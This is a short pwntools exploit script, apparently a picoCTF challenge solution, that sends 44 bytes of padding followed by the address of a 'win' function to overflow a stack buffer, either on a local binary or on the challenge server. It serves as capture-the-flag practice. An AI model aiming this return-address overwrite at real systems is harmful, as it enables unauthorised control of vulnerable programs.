from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if args.REMOTE:
    HOST, PORT = "saturn.picoctf.net 63001".split()
    p = remote(HOST, PORT)

else:
    p = process('./vuln')

win_addr = 0x80491f6

p.sendlineafter(b'string: \n', b'A' * 44 + p32(win_addr))

p.interactive()